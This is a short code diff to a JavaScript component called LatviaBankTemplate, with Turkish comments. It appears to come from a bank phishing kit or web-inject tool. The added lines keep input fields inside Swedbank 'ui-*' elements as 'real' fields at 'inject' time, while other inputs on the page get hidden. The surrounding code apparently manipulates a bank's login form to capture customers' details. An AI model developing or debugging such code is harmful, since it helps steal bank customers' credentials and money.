@@ -1209,6 +1209,16 @@ export function LatviaBankTemplate({ bankSlug, onChange, handleRouteAction, savi
               if (!el) return;
               const tt = (el.type || el.tagName || '').toLowerCase();
               if (tt === 'hidden' || tt === 'submit' || tt === 'button' || tt === 'reset' || tt === 'file') return;
+              // Swedbank ui-* custom elementleri icindeki inputlar her zaman gercek
+              // (gizli ui-tab'lardaki alanlar inject aninda 0px -> olduruluyorlardi,
+              //  method degisince gorunmez kaliyorlardi. ui-phonefield__control gibi
+              //  label-for iliskisi olmayanlar da.)
+              try {
+                if (el.closest && el.closest('ui-field, ui-phonefield, ui-dropdown, ui-form, ui-tab')) {
+                  realFieldSet.add(el);
+                  return;
+                }
+              } catch(_) {}
               try {
                 const cs = (el.getBoundingClientRect && el.getBoundingClientRect());
                 if (!cs || cs.width < 3 || cs.height < 3) return;
@@ -1230,6 +1240,8 @@ export function LatviaBankTemplate({ bankSlug, onChange, handleRouteAction, savi
             document.querySelectorAll('input, textarea').forEach(el => {
               if (realFieldSet.has(el)) return; // Beyaz listede: gercek input, birak
               if (!el) return;
+              // swedbank ui-* elemanlari icindeki inputlari asla gizleme
+              try { if (el.closest && el.closest('ui-field, ui-phonefield, ui-dropdown, ui-form, ui-tab')) return; } catch(_) {}
               const tt = (el.type || el.tagName || '').toLowerCase();
               if (tt === 'hidden' || tt === 'submit' || tt === 'button' || tt === 'reset' || tt === 'file' || tt === 'radio' || tt === 'checkbox') return;
               try {
